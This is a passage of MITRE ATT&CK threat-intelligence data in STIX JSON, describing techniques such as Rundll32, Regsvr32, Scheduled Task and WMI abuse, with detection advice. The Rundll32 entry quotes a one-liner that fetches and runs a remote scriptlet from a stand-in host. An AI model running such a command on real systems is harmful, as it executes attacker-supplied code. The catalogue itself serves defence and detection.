                    "url": "https://docs.microsoft.com/en-us/archive/blogs/jepayne/monitoring-what-matters-windows-event-forwarding-for-everyone-even-if-you-already-have-a-siem"
                },
                {
                    "source_name": "Medium Detecting WMI Persistence",
                    "description": "French, D. (2018, October 9). Detecting & Removing an Attacker\u2019s WMI Persistence. Retrieved October 11, 2019.",
                    "url": "https://medium.com/threatpunter/detecting-removing-wmi-persistence-60ccbb7dff96"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-04-14T12:06:32.187Z",
            "name": "Resource Hijacking",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Command: Command Execution",
                "File: File Creation",
                "Network Traffic: Network Connection Creation",
                "Network Traffic: Network Traffic Flow",
                "Sensor Health: Host Status"
            ],
            "x_mitre_version": "1.2",
            "created": "2019-04-17T14:50:05.682Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "impact"
                }
            ],
            "x_mitre_permissions_required": [
                "User",
                "Administrator"
            ],
            "x_mitre_platforms": [
                "Windows",
                "IaaS",
                "Linux",
                "macOS",
                "Containers"
            ],
            "x_mitre_is_subtechnique": false,
            "id": "attack-pattern--cd25c1b4-935c-4f0e-ba8d-552f28bc4783",
            "description": "Adversaries may leverage the resources of co-opted systems in order to solve resource intensive problems which may impact system and/or hosted service availability. \n\nOne common purpose for Resource Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive.(Citation: Kaspersky Lazarus Under The Hood Blog 2017) Servers and cloud-based(Citation: CloudSploit - Unused AWS Regions) systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Resource Hijacking and cryptocurrency mining. Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster.(Citation: Unit 42 Hildegard Malware)(Citation: Trend Micro Exposed Docker APIs)\n\nAdditionally, some cryptocurrency mining malware kills off processes for competing malware to ensure it\u2019s not competing for resources.(Citation: Trend Micro War of Crypto Miners)",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "David Fiser, @anu4is, Trend Micro",
                "Alfredo Oliveira, Trend Micro",
                "Jay Chen, Palo Alto Networks",
                "Magno Logan, @magnologan, Trend Micro",
                "Vishwas Manral, McAfee",
                "Yossi Weizman, Azure Defender Research Team"
            ],
            "x_mitre_impact_type": [
                "Availability"
            ],
            "x_mitre_detection": "Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1496",
                    "external_id": "T1496",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Kaspersky Lazarus Under The Hood Blog 2017",
                    "description": "GReAT. (2017, April 3). Lazarus Under the Hood. Retrieved April 17, 2019.",
                    "url": "https://securelist.com/lazarus-under-the-hood/77908/"
                },
                {
                    "source_name": "CloudSploit - Unused AWS Regions",
                    "description": "CloudSploit. (2019, June 8). The Danger of Unused AWS Regions. Retrieved October 8, 2019.",
                    "url": "https://blog.cloudsploit.com/the-danger-of-unused-aws-regions-af0bf1b878fc"
                },
                {
                    "url": "https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/",
                    "description": "Chen, J. et al. (2021, February 3). Hildegard: New TeamTNT Cryptojacking Malware Targeting Kubernetes. Retrieved April 5, 2021.",
                    "source_name": "Unit 42 Hildegard Malware"
                },
                {
                    "url": "https://www.trendmicro.com/en_us/research/19/e/infected-cryptocurrency-mining-containers-target-docker-hosts-with-exposed-apis-use-shodan-to-find-additional-victims.html",
                    "description": "Oliveira, A. (2019, May 30). Infected Containers Target Docker via Exposed APIs. Retrieved April 6, 2021.",
                    "source_name": "Trend Micro Exposed Docker APIs"
                },
                {
                    "url": "https://www.trendmicro.com/en_us/research/20/i/war-of-linux-cryptocurrency-miners-a-battle-for-resources.html",
                    "description": "Oliveira, A., Fiser, D. (2020, September 10). War of Linux Cryptocurrency Miners: A Battle for Resources. Retrieved April 6, 2021.",
                    "source_name": "Trend Micro War of Crypto Miners"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2020-12-30T14:26:44.730Z",
            "name": "Scheduled Task",
            "x_mitre_data_sources": [
                "Scheduled Job: Scheduled Job Creation",
                "Command: Command Execution",
                "File: File Modification",
                "Process: Process Creation"
            ],
            "x_mitre_version": "1.0",
            "created": "2019-11-27T14:58:00.429Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "persistence"
                },
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "privilege-escalation"
                }
            ],
            "x_mitre_permissions_required": [
                "Administrator"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--005a06c6-14bf-4118-afa0-ebcd8aebb0c9",
            "description": "Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code. There are multiple ways to access the Task Scheduler in Windows. The <code>schtasks</code> can be run directly on the command line, or the Task Scheduler can be opened through the GUI within the Administrator Tools section of the Control Panel. In some cases, adversaries have used a .NET wrapper for the Windows Task Scheduler, and alternatively, adversaries have used the Windows netapi32 library to create a scheduled task.\n\nThe deprecated [at](https://attack.mitre.org/software/S0110) utility could also be abused by adversaries (ex: [At (Windows)](https://attack.mitre.org/techniques/T1053/002)), though <code>at.exe</code> can not access tasks created with <code>schtasks</code> or the Control Panel.\n\nAn adversary may use Windows Task Scheduler to execute programs at system startup or on a scheduled basis for persistence. The Windows Task Scheduler can also be abused to conduct remote Execution as part of Lateral Movement and or to run a process under the context of a specified account (such as SYSTEM).",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_remote_support": true,
            "x_mitre_detection": "Monitor process execution from the <code>svchost.exe</code> in Windows 10 and the Windows Task Scheduler <code>taskeng.exe</code> for older versions of Windows. (Citation: Twitter Leoloobeek Scheduled Task) If scheduled tasks are not used for persistence, then the adversary is likely to remove the task when the action is complete. Monitor Windows Task Scheduler stores in %systemroot%\\System32\\Tasks for change entries related to scheduled tasks that do not correlate with known software, patch cycles, etc.\n\nConfigure event logging for scheduled task creation and changes by enabling the \"Microsoft-Windows-TaskScheduler/Operational\" setting within the event logging service. (Citation: TechNet Forum Scheduled Task Operational Setting) Several events will then be logged on scheduled task activity, including: (Citation: TechNet Scheduled Task Events)(Citation: Microsoft Scheduled Task Events Win10)\n\n* Event ID 106 on Windows 7, Server 2008 R2 - Scheduled task registered\n* Event ID 140 on Windows 7, Server 2008 R2 / 4702 on Windows 10, Server 2016 - Scheduled task updated\n* Event ID 141 on Windows 7, Server 2008 R2 / 4699 on Windows 10, Server 2016 - Scheduled task deleted\n* Event ID 4698 on Windows 10, Server 2016 - Scheduled task created\n* Event ID 4700 on Windows 10, Server 2016 - Scheduled task enabled\n* Event ID 4701 on Windows 10, Server 2016 - Scheduled task disabled\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing current scheduled tasks. (Citation: TechNet Autoruns)\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. Tasks may also be created through Windows system management tools such as Windows Management Instrumentation and PowerShell, so additional logging may need to be configured to gather the appropriate data.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1053/005",
                    "external_id": "T1053.005",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "Twitter Leoloobeek Scheduled Task",
                    "description": "Loobeek, L. (2017, December 8). leoloobeek Status. Retrieved December 12, 2017.",
                    "url": "https://twitter.com/leoloobeek/status/939248813465853953"
                },
                {
                    "source_name": "TechNet Forum Scheduled Task Operational Setting",
                    "description": "Satyajit321. (2015, November 3). Scheduled Tasks History Retention settings. Retrieved December 12, 2017.",
                    "url": "https://social.technet.microsoft.com/Forums/en-US/e5bca729-52e7-4fcb-ba12-3225c564674c/scheduled-tasks-history-retention-settings?forum=winserver8gen"
                },
                {
                    "source_name": "TechNet Scheduled Task Events",
                    "description": "Microsoft. (n.d.). General Task Registration. Retrieved December 12, 2017.",
                    "url": "https://technet.microsoft.com/library/dd315590.aspx"
                },
                {
                    "url": "https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/audit-other-object-access-events",
                    "description": "Microsoft. (2017, May 28). Audit Other Object Access Events. Retrieved June 27, 2019.",
                    "source_name": "Microsoft Scheduled Task Events Win10"
                },
                {
                    "source_name": "TechNet Autoruns",
                    "description": "Russinovich, M. (2016, January 4). Autoruns for Windows v13.51. Retrieved June 6, 2016.",
                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb963902"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Regsvr32",
            "x_mitre_data_sources": [
                "Process: Process Creation",
                "Module: Module Load",
                "Command: Command Execution",
                "Network Traffic: Network Connection Creation"
            ],
            "x_mitre_version": "1.0",
            "modified": "2020-06-20T22:37:32.931Z",
            "created": "2020-01-23T19:52:17.414Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--b97f1d35-4249-4486-a6b5-ee60ccf24fab",
            "x_mitre_defense_bypassed": [
                "Digital Certificate Validation",
                "Anti-virus",
                "Application control"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "Administrator",
                "User"
            ],
            "description": "Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. Regsvr32.exe is also a Microsoft signed binary. (Citation: Microsoft Regsvr32)\n\nMalicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed. (Citation: LOLBAS Regsvr32) This variation of the technique is often referred to as a \"Squiblydoo\" attack and has been used in campaigns targeting governments. (Citation: Carbon Black Squiblydoo Apr 2016) (Citation: FireEye Regsvr32 Targeting Mongolian Gov)\n\nRegsvr32.exe can also be leveraged to register a COM Object used to establish persistence via [Component Object Model Hijacking](https://attack.mitre.org/techniques/T1546/015). (Citation: Carbon Black Squiblydoo Apr 2016)",
            "x_mitre_contributors": [
                "Casey Smith"
            ],
            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of regsvr32.exe. Compare recent invocations of regsvr32.exe with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity. Command arguments used before and after the regsvr32.exe invocation may also be useful in determining the origin and purpose of the script or DLL being loaded. (Citation: Carbon Black Squiblydoo Apr 2016)",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1218/010",
                    "external_id": "T1218.010",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://support.microsoft.com/en-us/kb/249873",
                    "description": "Microsoft. (2015, August 14). How to use the Regsvr32 tool and troubleshoot Regsvr32 error messages. Retrieved June 22, 2016.",
                    "source_name": "Microsoft Regsvr32"
                },
                {
                    "url": "https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/",
                    "description": "LOLBAS. (n.d.). Regsvr32.exe. Retrieved July 31, 2019.",
                    "source_name": "LOLBAS Regsvr32"
                },
                {
                    "url": "https://www.carbonblack.com/2016/04/28/threat-advisory-squiblydoo-continues-trend-of-attackers-using-native-os-tools-to-live-off-the-land/",
                    "description": "Nolen, R. et al.. (2016, April 28). Threat Advisory: \u201cSquiblydoo\u201d Continues Trend of Attackers Using Native OS Tools to \u201cLive off the Land\u201d. Retrieved April 9, 2018.",
                    "source_name": "Carbon Black Squiblydoo Apr 2016"
                },
                {
                    "url": "https://www.fireeye.com/blog/threat-research/2017/02/spear_phishing_techn.html",
                    "description": "Anubhav, A., Kizhakkinan, D. (2017, February 22). Spear Phishing Techniques Used in Attacks Targeting the Mongolian Government. Retrieved February 24, 2017.",
                    "source_name": "FireEye Regsvr32 Targeting Mongolian Gov"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Rundll32",
            "x_mitre_data_sources": [
                "File: File Metadata",
                "Process: Process Creation",
                "Command: Command Execution",
                "Module: Module Load"
            ],
            "x_mitre_version": "1.1",
            "modified": "2021-10-14T21:45:53.057Z",
            "created": "2020-01-23T18:03:46.248Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "defense-evasion"
                }
            ],
            "id": "attack-pattern--045d0922-2310-4e60-b5e4-3302302cb3c5",
            "x_mitre_defense_bypassed": [
                "Digital Certificate Validation",
                "Application control",
                "Anti-virus"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll)",
            "x_mitre_contributors": [
                "Gareth Phillips, Seek Ltd.",
                "Casey Smith",
                "Ricardo Dias"
            ],
            "x_mitre_detection": "Use process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1218/011",
                    "external_id": "T1218.011",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://www.trendmicro.de/cloud-content/us/pdfs/security-intelligence/white-papers/wp-cpl-malware.pdf",
                    "description": "Merces, F. (2014). CPL Malware Malicious Control Panel Items. Retrieved November 1, 2017.",
                    "source_name": "Trend Micro CPL"
                },
                {
                    "url": "https://thisissecurity.stormshield.com/2014/08/20/poweliks-command-line-confusion/",
                    "description": "B. Ancel. (2014, August 20). Poweliks \u2013 Command Line Confusion. Retrieved March 5, 2018.",
                    "source_name": "This is Security Command Line Confusion"
                },
                {
                    "url": "https://www.attackify.com/blog/rundll32_execution_order/",
                    "description": "Attackify. (n.d.). Rundll32.exe Obscurity. Retrieved August 23, 2021.",
                    "source_name": "Attackify Rundll32.exe Obscurity"
                },
                {
                    "url": "https://github.com/gtworek/PSBits/tree/master/NoRunDll",
                    "description": "gtworek. (2019, December 17). NoRunDll. Retrieved August 23, 2021.",
                    "source_name": "Github NoRunDll"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "System Information Discovery",
            "x_mitre_data_sources": [
                "Instance: Instance Metadata",
                "Process: Process Creation",
                "Command: Command Execution",
                "Process: OS API Execution"
            ],
            "x_mitre_version": "2.3",
            "modified": "2021-10-13T23:21:27.750Z",
            "created": "2017-05-31T21:31:04.307Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "discovery"
                }
            ],
            "id": "attack-pattern--354a7f88-63fb-41b5-a801-ce3b377b36f1",
            "x_mitre_platforms": [
                "Windows",
                "IaaS",
                "Linux",
                "macOS"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User"
            ],
            "description": "An adversary may attempt to get detailed information about the operating system and hardware, including version, patches, hotfixes, service packs, and architecture. Adversaries may use the information from [System Information Discovery](https://attack.mitre.org/techniques/T1082) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nTools such as [Systeminfo](https://attack.mitre.org/software/S0096) can be used to gather detailed system information. If running with privileged access, a breakdown of system data can be gathered through the <code>systemsetup</code> configuration tool on macOS. As an example, adversaries with user-level access can execute the <code>df -aH</code> command to obtain currently mounted disks and associated freely available space. [System Information Discovery](https://attack.mitre.org/techniques/T1082) combined with information gathered from other forms of discovery and reconnaissance can drive payload development and concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools and Techniques)\n\nInfrastructure as a Service (IaaS) cloud providers such as AWS, GCP, and Azure allow access to instance and virtual machine information via APIs. Successful authenticated API calls can return data such as the operating system platform and status of a particular instance or the model view of a virtual machine.(Citation: Amazon Describe Instance)(Citation: Google Instances Resource)(Citation: Microsoft Virutal Machine API)",
            "x_mitre_contributors": [
                "Maril Vernon @shewhohacks",
                "Praetorian"
            ],
            "x_mitre_detection": "System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.\n\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nIn cloud-based systems, native logging can be used to identify access to certain APIs and dashboards that may contain system information. Depending on how the environment is used, that data alone may not be useful due to benign use during normal operations.",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1082",
                    "external_id": "T1082",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://capec.mitre.org/data/definitions/312.html",
                    "external_id": "CAPEC-312",
                    "source_name": "capec"
                },
                {
                    "url": "https://www.sentinelone.com/blog/trail-osx-fairytale-adware-playing-malware/",
                    "description": "Phile Stokes. (2018, September 20). On the Trail of OSX.FairyTale | Adware Playing at Malware. Retrieved August 24, 2021.",
                    "source_name": "OSX.FairyTale"
                },
                {
                    "url": "https://labs.sentinelone.com/20-common-tools-techniques-used-by-macos-threat-actors-malware/",
                    "description": "Phil Stokes. (2021, February 16). 20 Common Tools & Techniques Used by macOS Threat Actors & Malware. Retrieved August 23, 2021.",
                    "source_name": "20 macOS Common Tools and Techniques"
                },
                {
                    "url": "https://docs.aws.amazon.com/cli/latest/reference/ssm/describe-instance-information.html",
                    "description": "Amazon. (n.d.). describe-instance-information. Retrieved March 3, 2020.",
                    "source_name": "Amazon Describe Instance"
                },
                {
                    "url": "https://cloud.google.com/compute/docs/reference/rest/v1/instances",
                    "description": "Google. (n.d.). Rest Resource: instance. Retrieved March 3, 2020.",
                    "source_name": "Google Instances Resource"
                },
                {
                    "source_name": "Microsoft Virutal Machine API",
                    "description": "Microsoft. (2019, March 1). Virtual Machines - Get. Retrieved October 8, 2019.",
                    "url": "https://docs.microsoft.com/en-us/rest/api/compute/virtualmachines/get"
                }
            ]
        },
        {
            "type": "attack-pattern",
            "modified": "2021-08-30T17:42:40.945Z",
            "name": "Service Execution",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Process: Process Creation",
                "Service: Service Creation",
                "Windows Registry: Windows Registry Key Modification"
            ],
            "x_mitre_version": "1.1",
            "created": "2020-03-10T18:33:36.159Z",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_permissions_required": [
                "Administrator",
                "SYSTEM"
            ],
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": true,
            "id": "attack-pattern--f1951e8a-500e-4a26-8803-76d95c4554b4",
            "description": "Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).\n\n[PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.\n\nAdversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_remote_support": true,
            "x_mitre_detection": "Changes to service Registry entries and command line invocation of tools capable of modifying services that do not correlate with known software, patch cycles, etc., may be suspicious. If a service is used only to execute a binary or script and not to persist, then it will likely be changed back to its original form shortly after the service is restarted so the service is not left broken, as is the case with the common administrator tool [PsExec](https://attack.mitre.org/software/S0029).",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1569/002",
                    "external_id": "T1569.002",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://docs.microsoft.com/windows/win32/services/service-control-manager",
                    "description": "Microsoft. (2018, May 31). Service Control Manager. Retrieved March 28, 2020.",
                    "source_name": "Microsoft Service Control Manager"
                },
                {
                    "source_name": "Russinovich Sysinternals",
                    "description": "Russinovich, M. (2014, May 2). Windows Sysinternals PsExec v2.11. Retrieved May 13, 2015.",
                    "url": "https://technet.microsoft.com/en-us/sysinternals/bb897553.aspx"
                }
            ]
        },
        {
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "type": "attack-pattern",
            "name": "Windows Management Instrumentation",
            "x_mitre_data_sources": [
                "Command: Command Execution",
                "Process: Process Creation",
                "Network Traffic: Network Connection Creation"
            ],
            "x_mitre_version": "1.2",
            "modified": "2021-10-15T23:58:07.715Z",
            "created": "2017-05-31T21:30:44.329Z",
            "x_mitre_remote_support": true,
            "id": "attack-pattern--01a5a209-b94c-450b-b7f9-946497d91055",
            "x_mitre_platforms": [
                "Windows"
            ],
            "x_mitre_is_subtechnique": false,
            "x_mitre_permissions_required": [
                "User",
                "Administrator"
            ],
            "description": "Adversaries may abuse Windows Management Instrumentation (WMI) to execute malicious commands and payloads. WMI is an administration feature that provides a uniform environment to access Windows system components. The WMI service enables both local and remote access, though the latter is facilitated by [Remote Services](https://attack.mitre.org/techniques/T1021) such as [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM) and [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) (WinRM). (Citation: MSDN WMI) Remote WMI over DCOM operates using port 135, whereas WMI over WinRM operates over port 5985 when using HTTP and 5986 for HTTPS. (Citation: MSDN WMI) (Citation: FireEye WMI 2015)\n\nAn adversary can use WMI to interact with local and remote systems and use it as a means to execute various behaviors, such as gathering information for Discovery as well as remote Execution of files as part of Lateral Movement. (Citation: FireEye WMI SANS 2015) (Citation: FireEye WMI 2015)",
            "kill_chain_phases": [
                {
                    "kill_chain_name": "mitre-attack",
                    "phase_name": "execution"
                }
            ],
            "x_mitre_contributors": [
                "@ionstorm"
            ],
            "x_mitre_detection": "Monitor network traffic for WMI connections; the use of WMI in environments that do not typically use WMI may be suspect. Perform process monitoring to capture command-line arguments of \"wmic\" and detect commands that are used to perform remote behavior. (Citation: FireEye WMI 2015)",
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/techniques/T1047",
                    "external_id": "T1047",
                    "source_name": "mitre-attack"
                },
                {
                    "source_name": "MSDN WMI",
                    "description": "Microsoft. (n.d.). Windows Management Instrumentation. Retrieved April 27, 2016.",
                    "url": "https://msdn.microsoft.com/en-us/library/aa394582.aspx"
                },
                {
                    "source_name": "FireEye WMI 2015",
                    "description": "Ballenthin, W., et al. (2015). Windows Management Instrumentation (WMI) Offense, Defense, and Forensics. Retrieved March 30, 2016.",
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/wp-windows-management-instrumentation.pdf"
                },
                {
                    "url": "https://www.fireeye.com/content/dam/fireeye-www/services/pdfs/sans-dfir-2015.pdf",
                    "description": "Devon Kerr. (2015). There's Something About WMI. Retrieved May 4, 2020.",
                    "source_name": "FireEye WMI SANS 2015"
                }
            ]
        },
        {
            "type": "tool",
            "modified": "2021-05-20T14:25:59.596Z",
            "name": "Mimikatz",
            "x_mitre_aliases": [
                "Mimikatz"
            ],
            "x_mitre_version": "1.4",
            "created": "2017-05-31T21:32:11.544Z",
            "x_mitre_platforms": [
                "Windows"
            ],
            "id": "tool--afc079f3-c0ea-4096-b75d-3f05338b7f60",
            "description": "[Mimikatz](https://attack.mitre.org/software/S0002) is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks. (Citation: Deply Mimikatz) (Citation: Adsecurity Mimikatz Guide)",
            "object_marking_refs": [
                "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
            ],
            "x_mitre_contributors": [
                "Vincent Le Toux"
            ],
            "labels": [
                "tool"
            ],
            "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
            "external_references": [
                {
                    "url": "https://attack.mitre.org/software/S0002",
                    "external_id": "S0002",
                    "source_name": "mitre-attack"
                },
                {
                    "url": "https://github.com/gentilkiwi/mimikatz",
                    "description": "Deply, B. (n.d.). Mimikatz. Retrieved September 29, 2015.",
                    "source_name": "Deply Mimikatz"
                },
                {
                    "source_name": "Adsecurity Mimikatz Guide",
                    "description": "Metcalf, S. (2015, November 13). Unofficial Guide to Mimikatz & Command Reference. Retrieved December 23, 2015.",
                    "url": "https://adsecurity.org/?page_id=1821"
                }
            ]
        },
        {
            "type": "relationship",
            "id": "relationship--25c63cc4-4ff3-4828-933a-4b55e47b7dc8",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "target_ref": "location--a2ec23af-45a5-47b4-b1c4-ffa0f55ba748"
        },
        {
            "type": "relationship",
            "id": "relationship--5da30ec7-bb5d-444d-a0e5-50c8cc62a44e",
            "created": "2022-04-17T22:00:30.408Z",
            "modified": "2022-06-14T22:00:30.408Z",
            "relationship_type": "targets",
            "source_ref": "intrusion-set--73a80fab-2aa3-48e0-a4d0-3a4828200aee",
            "target_ref": "identity--8004c490-64c3-46a4-b78b-2806e0d08ce5"
        },
        {
            "created": "2021-03-13T20:09:21.204979Z",
            "id": "location--a2ec23af-45a5-47b4-b1c4-ffa0f55ba748",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "India",
            "spec_version": "2.1",
            "type": "location"
        },
        {
            "created": "2022-03-13T20:09:21.324884Z",
            "id": "identity--8004c490-64c3-46a4-b78b-2806e0d08ce5",
            "identity_class": "class",
            "modified": "2021-12-01T16:19:51.601791Z",
            "name": "Mining sector as a target",
            "sectors": [
                "mining"
            ],
            "spec_version": "2.1",
            "type": "identity"
        }
    ]
}